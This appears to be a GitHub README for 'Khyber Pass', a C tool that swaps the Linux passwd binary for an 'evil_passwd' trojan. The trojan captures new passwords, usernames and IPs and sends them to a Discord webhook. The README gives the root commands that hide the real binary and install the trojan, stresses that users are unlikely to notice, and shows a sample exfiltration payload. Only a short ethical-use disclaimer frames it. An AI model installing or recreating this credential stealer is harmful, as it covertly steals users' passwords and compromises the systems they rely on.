# Khyber Pass 🛡️🔑

Khyber Pass is a **Penetration Testing tool** designed to intercept password changes on Linux systems. It effectively **filters** the `passwd` command to capture any passwords entered by the user and sends them to a specified **Discord Webhook** for monitoring purposes.

This tool acts as a **stealthy filter**, *not* replacing the `passwd` binary but rather hijacking it to log user input. This makes it perfect for **ethical hacking** or **red team operations** where monitoring password changes is crucial.

## Features 🌟

- **Intercepts password changes**: Captures user-entered passwords during password change attempts.
- **Sends data to a Discord webhook**: Logs and sends the intercepted password change details (e.g., username, IP address, input) to a Discord channel.
- **Stealth operation**: Does not replace `passwd` but hides behind it, making it difficult for users to notice.
- **Easy installation**: Scripts to help you install dependencies and compile the tool.

## Installation 🚀

### Prerequisites 🖥️

Before getting started, make sure you have the following installed on your system:

- A **Linux system** with **root privileges**.
- **gcc**, **libcurl**, and **curl** installed.

If these are not present, don’t worry! The `install.sh` script will handle them for you.

### Step 1: Clone the Repository 🧑‍💻

Clone this repository to your local machine using the following command:

```bash
git clone https://github.com/your-username/khyber-pass.git
cd khyber-pass
```

### Step 2: Install Dependencies 📦

Run the `install.sh` script to automatically detect your package manager and install necessary dependencies:

```bash
sudo ./install.sh
```

This script will install the following:

- **libcurl** (for interacting with webhooks)
- **gcc** (C compiler)
- **curl** (for network requests)

### Step 3: Compile the Evil Passwd 💻

Next, compile the tool using the provided `compile.sh` script. It will also ask you to input a **Discord Webhook URL**.

```bash
./compile.sh
```

**Tip**: Make sure you have a valid Discord Webhook URL. You can create one through your Discord server settings.

### Step 4: Install the Evil Passwd 🔒

To install Khyber Pass, we need to move the existing `passwd` binary and place the new tool in its place. This will make the tool intercept password changes.

Run the following commands:

```bash
sudo mv /usr/bin/passwd /usr/bin/.passwd
sudo mv ./evil_passwd /usr/bin/passwd
```

Now, any attempt to change a password using `passwd` will trigger the `evil_passwd` binary, logging the captured data and sending it to the Discord webhook.

## Usage 🛠️

Once installed, whenever a user tries to change their password via the `passwd` command, Khyber Pass will intercept the operation and send a payload to the specified Discord webhook. The webhook will contain details such as:

- **Username**: The username of the user changing their password.
- **Private IP**: The system's private IP address.
- **Operation**: The operation performed (e.g., "User input received").
- **Args**: Any arguments passed to the `passwd` command.
- **Input**: The new password entered by the user.

### Example Payload 📤

Here's an example of the payload sent to the Discord webhook:

```json
{
  "content": "Username: ubuntu, Private IP: 10.0.0.103, Operation: User input received, Args: [], Input: new_passwd"
}
```

## Files 📂

### `evil_passwd.c` 📝

This is the C source code for the tool, which captures password changes and sends the data to a Discord webhook. You can view and modify the source code as needed.

### `compile.sh` ⚙️

A bash script to compile the `evil_passwd.c` file and set the correct **Discord Webhook URL**.

### `install.sh` 📦

A bash script that installs the necessary dependencies (`libcurl`, `gcc`, `curl`) on your system, automatically detecting your package manager.

## License 📄

This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for more information.

## Disclaimer ⚠️

Khyber Pass is intended for ethical and educational purposes only. Use this tool responsibly and ensure that you have explicit permission before conducting any penetration tests. Unauthorized use of this tool could be illegal and result in serious consequences.

---

🔗 **Follow us on GitHub for updates and issues**.  

